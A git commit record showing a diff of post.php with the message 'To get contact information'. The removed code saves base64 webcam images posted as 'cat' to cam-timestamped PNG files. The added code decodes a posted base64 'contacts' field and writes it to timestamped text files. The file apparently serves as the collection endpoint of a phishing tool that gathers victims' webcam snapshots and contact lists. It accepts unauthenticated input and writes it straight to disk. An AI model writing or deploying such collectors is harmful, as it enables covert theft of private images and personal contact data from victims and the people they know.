9e8983920a063abebcee816ca057853820f9ea9e
gipson778 <53097753+gipson778@users.noreply.github.com>
2023-03-12 07:13:15 +0530

    Update post.php
    To get contact information

--- post.php
+++ post.php
@@ -1,19 +1,15 @@
 <?php
-
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
-
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
-
+if(isset($_POST['contacts'])) {
+    // Get the contact list data from the POST request
+    $contactsData = $_POST['contacts'];
+    
+    // Decode the Base64-encoded contact list data
+    $decodedContactsData = base64_decode($contactsData);
+    
+    // Save the contact list data to a text file
+    $filename = 'contacts-' . date('Y-m-d_H-i-s') . '.txt'; // Generate a unique filename based on the current date and time
+    $file = fopen($filename, 'w'); // Open the file in write mode
+    fwrite($file, $decodedContactsData); // Write the contact list data to the file
+    fclose($file); // Close the file
 }
-
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
 ?>
-
